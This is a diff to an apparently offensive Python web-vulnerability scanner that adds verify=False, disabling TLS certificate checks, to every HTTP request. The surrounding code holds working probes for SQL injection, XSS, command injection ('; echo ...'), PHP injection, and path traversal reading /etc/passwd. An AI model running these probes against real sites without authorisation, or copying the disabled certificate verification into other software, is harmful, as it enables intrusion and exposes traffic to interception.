@@ -42,7 +42,7 @@ def sqlieb(u,logs=True,user_agent=None,returning=False,timeout=10,proxy=None,coo
   print("[*]Error Based SQL Injection test")
  try:
   u+="'"
-  rp= requests.get(u,headers = hea,proxies=proxy,timeout=timeout)
+  rp= requests.get(u,headers = hea,proxies=proxy,timeout=timeout,verify=False)
   r=rp.text
   if (('SQL command not properly ended' in r) or ('Query failed: ERROR: syntax error at or near' in r) or ('Unclosed quotation mark before the character string' in r) or ("You have an error in your SQL syntax" in r) or ("quoted string not properly terminated" in r) or ("mysql_fetch_array(): supplied argument is not a valid MySQL result resource in"in r)):
    s=True
@@ -93,8 +93,8 @@ def sqlibb(u,logs=True,returning=False,timeout=10,proxy=None,user_agent=None,coo
  try:
   if logs==True:
    print("[*]Boolean Based SQL Injection test")
-  r=requests.get(u+" and 1=2",headers=hea,proxies=proxy,timeout=timeout)
-  q=requests.get(u+" and 1=1",headers=hea,proxies=proxy,timeout=timeout)
+  r=requests.get(u+" and 1=2",headers=hea,proxies=proxy,timeout=timeout, verify=False)
+  q=requests.get(u+" and 1=1",headers=hea,proxies=proxy,timeout=timeout, verify=False)
   r1=r.text
   q1=q.text
   if ((r.status_code==200)and(q.status_code==200)):
@@ -157,7 +157,7 @@ def sqlitb(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None
   if logs==True:
    print("[*]Time Based SQL Injection test")
   t=time.time()
-  r=requests.get(u+sle,headers=hea,proxies=proxy,timeout=timeout)
+  r=requests.get(u+sle,headers=hea,proxies=proxy,timeout=timeout, verify=False)
   if ((time.time()-t>=delay)and (r.status_code==200)):
     s=True
  except:
@@ -198,7 +198,7 @@ def xssget(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
    d.update(extra)
   d.update(pl)
   try:
-     c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout).text
+     c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
      if  xp in c:
       return True
   except Exception as e:
@@ -233,7 +233,7 @@ def xsspost(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
    d.update(extra)
   d.update(pl)
   try:
-     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout ).text
+     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
      if xp in c:
       return True 
   except Exception as e:
@@ -373,7 +373,7 @@ def execlink(u,timeout=10,proxy=None,logs=True,returning=False,user_agent=None,c
    hea={'User-Agent': us}
  u+='; echo alaistestingyoursystem'
  try:
-  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout)
+  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout, verify=False)
   if (r.status_code==200):
    if ("alaistestingyoursystem" in r.text):
     s=True
@@ -403,7 +403,7 @@ def execget(u,param='',value='',extra=None,timeout=10,proxy=None,user_agent=None
  if extra:
   pl.update(extra)
  try:
-  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout)
+  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout, verify=False)
   if (r.status_code==200):
    if ("alaistestingyoursystem" in r.text):
     return True
@@ -429,7 +429,7 @@ def execpost(u,param='',value='',extra=None,timeout=10,proxy=None,user_agent=Non
  if extra:
   post.update(extra)
  try:
-  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout)
+  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout, verify=False)
   if (r.status_code==200):
    if ("alaistestingyoursystem" in r.text):
     return True
@@ -459,7 +459,7 @@ def phpget(u,param='',value='',end=False,extra=None,timeout=10,proxy=None,user_a
  if extra:
   pl.update(extra)
  try:
-  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout)
+  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout, verify=False)
   if (r.status_code==200):
    if ("alawashere" in r.text):
     return True
@@ -488,7 +488,7 @@ def phplink(u,closed=True,end=False,timeout=10,proxy=None,logs=True,returning=Fa
  if end==True:
   u+=";"
  try:
-  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout)
+  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout, verify=False)
   if (r.status_code==200):
    if ("alawashere" in r.text):
     s= True
@@ -524,7 +524,7 @@ def phppost(u,param='',value='',extra=None,end=False,timeout=10,proxy=None,user_
  if extra:
   post.update(extra)
  try:
-  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout)
+  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout, verify=False)
   if (r.status_code==200):
    if ("alawashere" in r.text):
     return True
@@ -561,7 +561,7 @@ def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=
    try:
     if logs==True:
      print("[*]Trying: "+ u+l)
-    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout)
+    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
     if ("root:x:0:0:root:/root:/bin/bash" in r.text):
      s=True
      x= {"Status":s,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
@@ -586,7 +586,7 @@ def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=
   try:
     if logs==True:
      print("[*]Trying: "+u+l)
-    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout)
+    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
     if ("root:x:0:0:root:/root:/bin/bash" in r.text):
      s=True
      x= {"Status":s,"Nullbyte":nullbyte,'Link':r.url}
